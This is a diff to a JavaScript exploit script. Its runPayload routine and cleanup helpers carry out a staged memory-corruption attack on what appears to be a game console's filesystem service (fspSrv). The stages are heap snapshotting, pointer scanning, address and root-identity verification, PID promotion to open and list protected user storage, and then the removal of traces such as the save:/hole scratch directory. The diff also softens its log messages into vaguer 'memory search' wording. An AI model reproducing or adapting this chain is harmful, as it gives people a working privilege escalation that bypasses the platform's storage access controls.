-            scratch, handles, helpers, addressCopy,
-            candidateCacheNeedsRetirement:
-                Boolean(alias.candidateCacheNeedsRetirement),
-            workerStateSafe: addressCopy.workerStateSafe
-        });
-        return;
-    }
-    handles = {...handles,
-        extraStorages: releaseSetup.extraStorages || []};
-    if (releaseSetup.eligible) {
-        await emitStage(releaseSetup.extraStorages.length + "/" +
-            releaseSetup.expectedStorages + " maximum storages ready (attempted=" +
-            releaseSetup.attemptedStorages + ")" +
-            (releaseSetup.failureReason
-                ? "; stopped=" + releaseSetup.failureReason + "." : "."));
-    } else {
-        await emitStage("Neighbor scan skipped (candidate=" +
-            (handles.candidateHandle ? "ready" : "unavailable") +
-            "; alias=" + (alias.aliasInstalled ? "installed" : "not-installed") +").");
-        await stopAndCleanup({
-            reason: "Neighbor scan is ineligible; skipping heap snapshot, pointer search, address qualification and promotion.",
+            reason: "Neighbor storage setup failed; " +
+                "skipping heap and address scans.",
             scratch, handles, helpers, addressCopy,
             candidateCacheNeedsRetirement:
                 Boolean(alias.candidateCacheNeedsRetirement),
@@ -1410,61 +814,86 @@ async function runPayload(attemptState) {
         return;
     }
 
+    handles = {...handles, extraStorages: releaseSetup.extraStorages || []};
+
+    if (releaseSetup.eligible) {
+        await emitStage("Memory search is ready.");
+        await emitVerboseStage(releaseSetup.extraStorages.length + "/" +
+            releaseSetup.expectedStorages + " storages prepared (attempted=" +
+            releaseSetup.attemptedStorages + "; stopped=" +
+            (releaseSetup.failureReason || "no") + ").");
+    } else {
+        await emitStage("Memory search is unavailable.");
+        await stopAndCleanup({
+            reason: "Neighbor scan is ineligible; skipping heap snapshot, " +
+                "pointer search, address qualification and promotion.",
+            scratch, handles, helpers, addressCopy,
+            candidateCacheNeedsRetirement:
+                Boolean(alias.candidateCacheNeedsRetirement),
+            workerStateSafe: addressCopy.workerStateSafe
+        });
+        return;
+    }
+
+    // Heap baseline capture and pointer scan
     let baseline = null;
     let release = {
         ok: true, extraStorages: releaseSetup.extraStorages,
         pointerCandidates: [], releaseRounds: 0, totalChangedLinks: 0,
         stopReason: releaseSetup.eligible ? "baseline-not-run" : "scan-ineligible"
     };
+
     if (releaseSetup.eligible) {
-        await emitStage("Capturing the initial heap snapshot...");
+        await emitStage("Capturing a memory snapshot...");
         baseline = await captureReleaseBaseline({
             config, candidateHandle: handles.candidateHandle,
             primeHex: candidateSetup.primeHex, helpers
         });
+
         if (baseline?.snapshotOk) {
-            await emitStage("Heap baseline captured (" + baseline.prevEnd +
-                " bytes; alias prefix matched).");
+            await emitStage("Memory snapshot captured.");
         } else {
-            await emitStage("Heap baseline rejected (read=" +
+            await emitStage("Memory snapshot could not be verified.");
+            await emitVerboseStage("Snapshot details: read=" +
                 formatCode(baseline?.readError) + "; prefixMatched=" +
                 Boolean(baseline?.prefixMatches) + "; dataBytes=" +
                 (baseline?.prevEnd || 0) + ").");
         }
 
-        await emitStage("Scanning neighboring releases for pointer candidates...");
+        await emitStage("Searching memory for candidates...");
         release = await releaseNeighborsAndFindPointers({
             config, candidateHandle: handles.candidateHandle,
             primeHex: candidateSetup.primeHex,
             extraStorages: releaseSetup.extraStorages,
             baseline, helpers
         });
+
         if (!release?.ok) {
-            await emitStage("Pointer scan failed (reason=" +
-                (release?.stopReason || "unknown") + ").");
+            await emitStage("Memory search failed.");
+            await emitVerboseStage("Memory search stopped: " +
+                (release?.stopReason || "unknown") + ".");
         } else if (release.stopReason === "baseline-not-qualified") {
-            await emitStage("Pointer scan skipped because the baseline was not qualified.");
+            await emitStage("Memory search skipped because the snapshot was not verified.");
         } else if (release.pointerCandidates.length) {
-            await emitStage(release.pointerCandidates.length +
-                " qualified candidates found across " + release.releaseRounds +
-                " rounds (changed links=" + release.totalChangedLinks +
-                (release.stopReason ? "; stopped=" + release.stopReason : "") +
-                (release.readError !== null && release.readError !== undefined
-                    ? "; readError=" + formatCode(release.readError) : "") + ").");
+            await emitStage("Memory candidates found.");
+            await emitVerboseStage(release.pointerCandidates.length +
+                " candidates found across " + release.releaseRounds +
+                " rounds (changed links=" + release.totalChangedLinks +").");
         } else {
-            await emitStage("No qualified pointer candidates found across " +
-                release.releaseRounds + " rounds (changed links=" +
-                release.totalChangedLinks +
-                (release.stopReason ? "; stopped=" + release.stopReason : "") +
-                (release.readError !== null && release.readError !== undefined
-                    ? "; readError=" + formatCode(release.readError) : "") + ").");
+            await emitStage("No memory candidates were found.");
+            await emitVerboseStage("Memory search details: rounds=" +
+                release.releaseRounds + "; changed links=" +
+                release.totalChangedLinks + "; stopped=" +
+                (release.stopReason || "no") + "; read error=" +
+                (release.readError == null ? "none" : formatCode(release.readError)) + ".");
         }
     } else {
-        await emitStage("Heap baseline skipped because the neighbor scan was ineligible.");
-        await emitStage("Pointer scan skipped because the neighbor scan was ineligible.");
+        await emitStage("Memory search was skipped.");
     }
+
     handles = {...handles,
         extraStorages: release?.extraStorages || releaseSetup.extraStorages || []};
+
     if (!release?.ok) {
         await stopAndCleanup({
             reason: "Pointer scan failed; skipping address qualification and promotion.",
@@ -1475,9 +904,11 @@ async function runPayload(attemptState) {
         });
         return;
     }
+
     if (!release.pointerCandidates?.length) {
         await stopAndCleanup({
-            reason: "No qualified pointer candidates; skipping address qualification and promotion.",
+            reason: "No qualified pointer candidates; " +
+                "skipping address qualification and promotion.",
             scratch, handles, helpers, addressCopy,
             candidateCacheNeedsRetirement:
                 Boolean(alias.candidateCacheNeedsRetirement),
@@ -1486,35 +917,63 @@ async function runPayload(attemptState) {
         return;
     }
 
-    await emitStage("Qualifying the cache period and address plan...");
+    // -- Phase 8: address qualification ---------------------------------
+
+    await emitStage("Verifying the memory address...");
     const addressStartedAt = Date.now();
     cleanupWorkerStateSafe = false;
+
     const address = await qualifyAddressPlan({
         config, helpers, addressCopy,
         aliasInstalled: alias.aliasInstalled,
         candidateHandle: handles.candidateHandle,
         collectTimingProfile: true,
-        reportProgress: emitProgress,
+        reportProgress: reportAddressProgress,
         pointerCandidates: release.pointerCandidates,
         primeHex: candidateSetup.primeHex,
         rootSession: handles.rootSession,
         savedHandle: handles.savedHandle,
         storageHandle: handles.storageHandle
     });
+
     cleanupWorkerStateSafe = address?.addressCopy?.workerStateSafe === true;
     const addressElapsedMs = Date.now() - addressStartedAt;
+
+    const addressReadyForPromotion = Boolean(
+        address?.ok && address.addressReadVerified &&
+        address.rootStageVerified && address.verifiedIdentityTargets &&
+        address.addressPlan && address.domainSession);
+    if (addressReadyForPromotion) {
+        await emitStage("MEMORY ADDRESS VERIFIED");
+    } else {
+        const missingChecks = [];
+        if (!address?.ok) missingChecks.push("qualification result");
+        if (!address?.addressReadVerified) missingChecks.push("address read");
+        if (!address?.rootStageVerified) missingChecks.push("root identity");
+        if (!address?.verifiedIdentityTargets)
+            missingChecks.push("identity targets");
+        if (!address?.addressPlan) missingChecks.push("address plan");
+        if (!address?.domainSession) missingChecks.push("domain session");
+
+        const reason = address?.addressFailureReason
+            ? address.addressFailureReason.replace(/-/g, " ")
+            : "required checks did not pass";
+        const detail = typeof address?.addressFailureDetail === "string"
+            ? address.addressFailureDetail.slice(0, 160) : "";
+        await emitStage("Memory address not ready for promotion: " + reason +
+            "; missing=" + missingChecks.join(", ") +
+            (detail ? "; detail=" + detail : "") + ".");
+    }
     for (const message of formatAddressResults(address, addressElapsedMs))
-        await emitProgress(message);
+        await emitVerboseStage(message);
+
     handles = {...handles, domainSession: address.domainSession};
     addressCopy = address?.addressCopy || addressCopy;
-    if (!address?.ok || !address.addressReadVerified ||
-        !address.rootStageVerified || !address.verifiedIdentityTargets ||
-        !address.addressPlan || !address.domainSession) {
-        const skipReason = promotionSkipReason(address, handles)
-            .replace(/-/g, " ");
+
+    if (!addressReadyForPromotion) {
         await stopAndCleanup({
-            reason: "Address or root identity was not fully verified (" +
-                skipReason + "); skipping PID promotion.",
+            reason: "Address or root identity was not fully verified; " +
+                "PID promotion was skipped.",
             scratch, handles, helpers, addressCopy,
             candidateCacheNeedsRetirement:
                 Boolean(addressCopy?.candidateCacheNeedsRetirement),
@@ -1524,8 +983,11 @@ async function runPayload(attemptState) {
         return;
     }
 
-    await emitStage("Temporarily promoting the verified PID fields and checking User storage...");
+    // -- Phase 9: PID promotion -----------------------------------------
+
+    await emitStage("Checking access to user storage...");
     cleanupWorkerStateSafe = false;
+
     const promotion = await runPromotionStep({
         config, addressPlan: address.addressPlan,
         addressCopy: address.addressCopy,
@@ -1536,48 +998,116 @@ async function runPayload(attemptState) {
         verifiedIdentityTargets: address.verifiedIdentityTargets,
         workerStateSafe: address.addressCopy.workerStateSafe
     });
+
     cleanupWorkerStateSafe = promotion?.workerStateSafe === true;
     addressCopy = promotion?.addressCopy || address.addressCopy;
     const promotionOutcome = promotion?.promotionOutcome || {};
-    attemptState.permissionProven = Boolean(promotion?.promotionAttempted &&
+
+    attemptState.permissionProven = Boolean(
+        promotion?.promotionAttempted &&
         promotionOutcome.promoted === true &&
         promotionOutcome.openedUserFs === true &&
         promotionOutcome.listedUserRoot === true &&
         promotionOutcome.listTransport === 0 &&
         promotionOutcome.listResult === 0);
+    attemptState.pidPromotionVerified = promotionOutcome.promoted === true;
+    attemptState.promotionTestHandlesClosed = Boolean(
+        promotionOutcome.contentFsHandleClosed !== false &&
+        promotionOutcome.contentFsDomainObjectClosed !== false);
     attemptState.promotionRestored = promotion?.promotionRestored === true;
-    await emitFastStage("Permission proof: " +
-        (attemptState.permissionProven
-            ? "User content-storage opened and / listed successfully"
-            : "not established") +
-        "; PID restoration=" +
-        (attemptState.promotionRestored ? "verified" :
-            promotion?.promotionAttempted ? "failed" : "not attempted") + ".");
-    await emitStage(formatPromotionResult(promotion, address, handles));
 
-    await emitStage("Retiring the retained endpoint...");
+    await emitStage(attemptState.permissionProven
+        ? "USER STORAGE ACCESS VERIFIED"
+        : "User storage access was not verified.");
+    await emitVerboseStage(formatPromotionResult(promotion, address, handles));
+
+    if (promotionOutcome.promotionRetained) {
+        await beginCleanupLog(attemptState);
+        cleanupAttempted = true;
+        const lightCleanup = await cleanupScratchAndHandles({
+            SCRATCH_DIR: scratch.SCRATCH_DIR,
+            auxiliaryStorageHandle: handles.auxiliaryStorageHandle,
+            candidateCacheNeedsRetirement: false,
+            candidateCacheRetired: false,
+            candidateHandle: handles.candidateHandle,
+            retainedEndpointActive: true,
+            domainSession: handles.domainSession,
+            keepDomainSessionOpen: true,
+            extentTriggerHandle: handles.extentTriggerHandle,
+            extraStorages: handles.extraStorages,
+            pinHandle: handles.pinHandle,
+            rootClones: handles.rootClones,
+            rootSession: handles.rootSession,
+            saveClones: handles.saveClones,
+            savedHandle: handles.savedHandle,
+            storageHandle: handles.storageHandle,
+            temporaryHandle: 0,
+            triggerHandle: handles.triggerHandle,
+            workerStateSafe: promotion.workerStateSafe
+        });
+
+        attemptState.promotionRetained = true;
+        attemptState.retainedEndpointActive = true;
+        attemptState.workersQuiesced = promotion.workerStateSafe === true;
+        attemptState.lightCleanupVerified = Boolean(
+            lightCleanup.cleanupVerified &&
+            promotionOutcome.contentFsHandleClosed !== false &&
+            promotionOutcome.contentFsDomainObjectClosed !== false);
+        attemptState.workerStateSafe = lightCleanup.workerStateSafe;
+        attemptState.primaryCleanupAttempted = lightCleanup.attempted === true;
+        attemptState.primaryCommitVerified =
+            lightCleanup.commitTransport === 0 && lightCleanup.commitResult === 0;
+        attemptState.primaryScratchCleanupVerified =
+            lightCleanup.attempted === true &&
+            lightCleanup.deleteTransport === 0 && lightCleanup.deleteResult === 0 &&
+            lightCleanup.commitTransport === 0 && lightCleanup.commitResult === 0;
+        attemptState.primaryHandlesClosed = Boolean(
+            lightCleanup.attempted === true &&
+            lightCleanup.handlesClosed === lightCleanup.expectedHandles &&
+            (lightCleanup.closeErrors || []).length === 0);
+        attemptState.cleanupSummary =
+            "fspSrv and candidate storage intentionally retained";
+        cleanupWorkerStateSafe = lightCleanup.workerStateSafe;
+        await emitVerboseStage(formatCleanupResult(lightCleanup,
+            lightCleanup.workerStateSafe));
+        return;
+    }
+
+    // -- Phase 10: endpoint retirement and final cleanup ----------------
+
+    await beginCleanupLog(attemptState);
     cleanupWorkerStateSafe = false;
+    attemptState.workersQuiesced = false;
+
     const retired = await retireCandidateCacheAndClose({
         helpers, addressCopy: promotion.addressCopy || address.addressCopy,
         candidateCacheNeedsRetirement:
-            (promotion.addressCopy || address.addressCopy).candidateCacheNeedsRetirement,
+            Boolean(attemptState.candidateCacheRetirementRequired ||
+                (promotion.addressCopy || address.addressCopy)
+                    .candidateCacheNeedsRetirement),
         candidateHandle: handles.candidateHandle,
         retireRetainedEndpoint: promotion.retireRetainedEndpoint,
         workerStateSafe: promotion.workerStateSafe
     });
+
+    attemptState.workersQuiesced = retired?.workersQuiesced === true;
+    attemptState.retainedEndpointActive = Boolean(
+        retired?.addressCopy?.retainedEndpointActive);
+
     cleanupWorkerStateSafe = retired?.workerStateSafe === true;
     addressCopy = retired?.addressCopy || addressCopy;
-    await emitStage(formatRetirementResult(retired));
+    await emitVerboseStage(formatRetirementResult(retired));
     handles = {...handles, candidateHandle: retired.candidateHandle};
 
-    await emitStage("Removing save:/hole and closing the remaining handles...");
     cleanupAttempted = true;
+
     const cleanup = await cleanupScratchAndHandles({
         SCRATCH_DIR: scratch.SCRATCH_DIR,
         auxiliaryStorageHandle: handles.auxiliaryStorageHandle,
         candidateHandle: handles.candidateHandle,
         candidateCacheNeedsRetirement:
-            retired.addressCopy.candidateCacheNeedsRetirement,
+            Boolean(attemptState.candidateCacheRetirementRequired ||
+                retired.addressCopy.candidateCacheNeedsRetirement),
         candidateCacheRetired: retired.candidateCacheRetired,
         retainedEndpointActive: retired.addressCopy.retainedEndpointActive,
         domainSession: handles.domainSession,
@@ -1593,14 +1123,17 @@ async function runPayload(attemptState) {
         triggerHandle: handles.triggerHandle,
         workerStateSafe: retired.workerStateSafe
     });
-    await emitStage(formatCleanupResult(cleanup, retired.workerStateSafe));
+
+    await emitVerboseStage(formatCleanupResult(cleanup, retired.workerStateSafe));
     recordCleanupState(attemptState, {retired, cleanup},
         retired.workerStateSafe,
         Boolean(retired.addressCopy?.candidateCacheNeedsRetirement));
+
     } finally {
         if (!cleanupAttempted) {
             await stopAndCleanup({
-                reason: "Workflow exited before its planned cleanup; attempting guarded cleanup.",
+                reason: "Workflow exited before its planned cleanup; " +
+                    "attempting guarded cleanup.",
                 scratch, handles, helpers, addressCopy,
                 candidateCacheNeedsRetirement:
                     Boolean(addressCopy?.candidateCacheNeedsRetirement),
@@ -1609,4 +1142,307 @@ async function runPayload(attemptState) {
             });
         }
     }
+}
+
+
+// ---------------------------------------------------------------------------
+// Stop-and-cleanup orchestration
+// ---------------------------------------------------------------------------
+
+async function performStopAndCleanup({
+    reason, scratch, handles, helpers,
+    addressCopy = null,
+    candidateCacheNeedsRetirement = false,
+    workerStateSafe = true,
+    domainSession = null
+}) {
+    await emitVerboseStage("Stopping reason: " + reason);
+
+    // Retire the candidate cache if a handle is still open
+    let retired = {
+        addressCopy,
+        candidateHandle: handles?.candidateHandle || 0,
+        candidateCacheRetired: Boolean(addressCopy?.candidateCacheRetired),
+        workerStateSafe: Boolean(workerStateSafe),
+        workersQuiesced: Boolean(workerStateSafe)
+    };
+
+    if (retired.candidateHandle) {
+        retired = await retireCandidateCacheAndClose({
+            helpers, addressCopy,
+            candidateCacheNeedsRetirement:
+                candidateCacheNeedsRetirement ||
+                Boolean(addressCopy?.candidateCacheNeedsRetirement),
+            candidateHandle: retired.candidateHandle,
+            retireRetainedEndpoint: null,
+            workerStateSafe: Boolean(workerStateSafe)
+        });
+        await emitVerboseStage(formatRetirementResult(retired));
+    }
+
+    // Delete save:/hole and close remaining handles
+    const finalAddressCopy = retired.addressCopy || addressCopy || {};
+    const finalWorkerStateSafe = Boolean(
+        retired.workerStateSafe ?? workerStateSafe);
+
+    const cleanup = await cleanupScratchAndHandles({
+        SCRATCH_DIR: scratch?.SCRATCH_DIR,
+        auxiliaryStorageHandle: handles?.auxiliaryStorageHandle || 0,
+        candidateHandle: retired.candidateHandle || 0,
+        candidateCacheNeedsRetirement: candidateCacheNeedsRetirement ||
+            Boolean(finalAddressCopy.candidateCacheNeedsRetirement),
+        candidateCacheRetired: Boolean(retired.candidateCacheRetired ||
+            finalAddressCopy.candidateCacheRetired),
+        retainedEndpointActive: Boolean(finalAddressCopy.retainedEndpointActive),
+        domainSession: domainSession || handles?.domainSession || null,
+        extentTriggerHandle: handles?.extentTriggerHandle || 0,
+        extraStorages: handles?.extraStorages || [],
+        pinHandle: handles?.pinHandle || 0,
+        rootClones: handles?.rootClones || [],
+        rootSession: handles?.rootSession || 0,
+        saveClones: handles?.saveClones || [],
+        savedHandle: handles?.savedHandle || 0,
+        storageHandle: handles?.storageHandle || 0,
+        temporaryHandle: handles?.preserveTemporaryHandleForCleanup
+            ? 0 : handles?.temporaryHandle || 0,
+        triggerHandle: handles?.triggerHandle || 0,
+        workerStateSafe: finalWorkerStateSafe
+    });
+
+    await emitVerboseStage(formatCleanupResult(cleanup, finalWorkerStateSafe));
+    return {retired, cleanup};
+}
+
+function recordCleanupState(attemptState, result, workerStateSafe,
+    candidateCacheNeedsRetirement) {
+    const retired = result?.retired;
+    const cleanup = result?.cleanup;
+
+    const retirementVerified = Boolean(retired && retired.ok !== false &&
+        !retired.failureReason && retired.candidateHandle === 0 &&
+        (!candidateCacheNeedsRetirement || retired.candidateCacheRetired ||
+            retired.addressCopy?.candidateCacheRetired));
+    candidateCacheNeedsRetirement = Boolean(candidateCacheNeedsRetirement ||
+        attemptState.candidateCacheRetirementRequired);
+    const cacheRetirementVerified = Boolean(!candidateCacheNeedsRetirement ||
+        retired?.candidateCacheRetired ||
+        retired?.addressCopy?.candidateCacheRetired);
+
+    attemptState.primaryCleanupAttempted = cleanup?.attempted === true;
+    attemptState.primaryCommitVerified =
+        cleanup?.commitTransport === 0 && cleanup?.commitResult === 0;
+    attemptState.primaryScratchCleanupVerified =
+        cleanup?.attempted === true &&
+        cleanup?.deleteTransport === 0 && cleanup?.deleteResult === 0 &&
+        cleanup?.commitTransport === 0 && cleanup?.commitResult === 0;
+    attemptState.primaryHandlesClosed = Boolean(
+        cleanup?.attempted === true &&
+        cleanup.handlesClosed === cleanup.expectedHandles &&
+        (cleanup.closeErrors || []).length === 0);
+    attemptState.endpointRetirementVerified = retirementVerified;
+    attemptState.cacheRetirementVerified = cacheRetirementVerified;
+    attemptState.candidateCacheRetirementRequired =
+        candidateCacheNeedsRetirement;
+    attemptState.retainedEndpointActive = Boolean(
+        retired?.addressCopy?.retainedEndpointActive);
+    attemptState.workersQuiesced = Boolean(
+        retired?.workersQuiesced ?? workerStateSafe);
+
+    attemptState.workerStateSafe = Boolean(
+        workerStateSafe === true &&
+        retired?.workerStateSafe === true &&
+        cleanup?.workerStateSafe === true);
+    attemptState.cleanupVerified = Boolean(retirementVerified &&
+        cleanup?.cleanupVerified === true && attemptState.workerStateSafe);
+
+    attemptState.safeToRetry = false;
+    attemptState.cleanupSummary = attemptState.cleanupVerified
+        ? "cache retired, save scratch deleted and committed, all handles closed"
+        : "cleanup not fully verified";
+}
+
+
+// ---------------------------------------------------------------------------
+// IPC helper
+// ---------------------------------------------------------------------------
+
+function readEntryTypeChecked(handle, path) {
+    const pathBuf = allocPage(0x1000);
+    const packet = allocPage(0x2000);
+
+    writeStr(pathBuf, path);
+    prepPacket(packet, (4 | (1 << 16)) >>> 0, 8, []);
+    writeXDesc(packet, 8, pathBuf, path.length + 1);
+    write32(packet + 0x10n, 0x49434653n);
+    write32(packet + 0x18n, 7n);
+
+    const transport = Number(sendIPC(handle, packet)) >>> 0;
+    if (transport !== 0)
+        return {transport, result: null, type: null};
+
+    const reply = cmifReply(packet);
+    return {
+        transport,
+        result: reply.result,
+        type: reply.result === 0
+            ? Number(read32(packet + BigInt(reply.data))) >>> 0
+            : null
+    };
+}
+
+
+// ---------------------------------------------------------------------------
+// Independent /hole cleanup (fallback path)
+// ---------------------------------------------------------------------------
+
+async function runHoleCleanupHandler(attemptState) {
+    const handle = attemptState.holeCleanupHandle;
+    if (!handle) {
+        attemptState.holeAbsentVerified = false;
+        attemptState.holeCleanupVerified = false;
+        await emitVerboseStage(
+            "HOLE FALLBACK: no independent save handle; " +
+            "absence cannot be verified.");
+        return false;
+    }
+
+    let initial = null;
+    let deletion = null;
+    let commit = null;
+    let verification = null;
+    let reason = null;
+    let shouldVerify = false;
+    let closeResult = null;
+    let absenceVerifiedByPrimary = false;
+
+    try {
+        await emitVerboseStage(
+            "HOLE FALLBACK: checking /hole on the reserved " +
+            "temporary save handle.");
+
+        if (!attemptState.workersQuiesced) {
+            reason = "workers-not-quiesced";
+
+        } else if (attemptState.primaryScratchCleanupVerified) {
+            absenceVerifiedByPrimary = true;
+
+        } else {
+            initial = readEntryTypeChecked(handle, SCRATCH_DIR);
+
+            if (initial.transport !== 0) {
+                reason = "initial-check-transport=" +
+                    formatCode(initial.transport);
+
+            } else if (initial.result === NOT_FOUND) {
+                if (!attemptState.primaryCommitVerified) {
+                    commit = ipcCommitChecked(handle);
+                    if (commit.transport !== 0 || commit.result !== 0) {
+                        reason = "recommit-failed";
+                    } else {
+                        verification = readEntryTypeChecked(handle, SCRATCH_DIR);
+                        if (verification.transport !== 0 ||
+                            verification.result !== NOT_FOUND)
+                            reason = "absence-verification-failed-after-recommit";
+                    }
+                } else {
+                    verification = initial;
+                }
+                shouldVerify = !reason && Boolean(verification);
+
+            } else if (initial.result === 0 && initial.type === 0) {
+                deletion = ipcDeleteDirectoryRecursivelyChecked(handle, SCRATCH_DIR);
+                if (deletion.transport !== 0 || deletion.result !== 0) {
+                    reason = "delete-failed";
+                } else {
+                    commit = ipcCommitChecked(handle);
+                    if (commit.transport !== 0 || commit.result !== 0)
+                        reason = "commit-failed";
+                    else
+                        shouldVerify = true;
+                }
+
+            } else if (initial.result === 0) {
+                reason = "path-exists-but-is-not-a-directory";
+
+            } else {
+                reason = "initial-check-result=" + formatCode(initial.result);
+            }
+
+            if (shouldVerify && !verification) {
+                verification = readEntryTypeChecked(handle, SCRATCH_DIR);
+                if (verification.transport !== 0 ||
+                    verification.result !== NOT_FOUND)
+                    reason = "absence-verification-failed";
+            }
+        }
+    } catch (error) {
+        reason = "handler-threw:" + String(error?.message || error);
+    } finally {
+        attemptState.holeAbsentVerified = Boolean(
+            !reason &&
+            (absenceVerifiedByPrimary ||
+                (shouldVerify &&
+                    verification?.transport === 0 &&
+                    verification?.result === NOT_FOUND)));
+        try {
+            closeResult = Number(closeHandle(handle)) >>> 0;
+        } catch (error) {
+            reason = reason || "handle-close-threw:" +
+                String(error?.message || error);
+        }
+        attemptState.holeCleanupHandle = 0;
+    }
+
+    attemptState.holeCleanupVerified = Boolean(
+        attemptState.holeAbsentVerified &&
+        closeResult === 0);
+
+    if (!attemptState.cleanupVerified &&
+        attemptState.holeCleanupVerified &&
+        attemptState.primaryCleanupAttempted &&
+        attemptState.primaryHandlesClosed &&
+        attemptState.endpointRetirementVerified &&
+        attemptState.workerStateSafe) {
+        attemptState.cleanupVerified = true;
+        attemptState.cleanupSummary =
+            "fallback /hole cleanup verified; " +
+            "endpoint retired and all primary handles closed";
+    }
+
+    let initialText;
+    if (absenceVerifiedByPrimary) {
+        initialText = "primary-cleanup-verified";
+    } else if (initial?.transport !== 0) {
+        initialText = "transport=" + formatCode(initial?.transport);
+    } else if (initial?.result === NOT_FOUND) {
+        initialText = "already-absent";
+    } else if (initial?.result === 0) {
+        initialText = "present-type=" + initial.type;
+    } else {
+        initialText = "result=" + formatCode(initial?.result);
+    }
+
+    let commitText;
+    if (commit) {
+        commitText = formatCode(commit.transport) + "/" +
+            formatCode(commit.result);
+    } else if (attemptState.primaryCommitVerified) {
+        commitText = "primary-verified";
+    } else {
+        commitText = "not-needed";
+    }
+
+    await emitVerboseStage(
+        "HOLE FALLBACK: initial=" + initialText +
+        "; delete=" + (deletion
+            ? formatCode(deletion.transport) + "/" +
+              formatCode(deletion.result)
+            : "not-needed") +
+        "; commit=" + commitText +
+        "; fallbackIpc=" + (absenceVerifiedByPrimary ? "skipped" : "used") +
+        "; absent=" + (attemptState.holeAbsentVerified ? "verified" : "no") +
+        "; handleClose=" + formatCode(closeResult) +
+        (reason ? "; reason=" + reason : "") + ".");
+
+    return attemptState.holeCleanupVerified;
 }
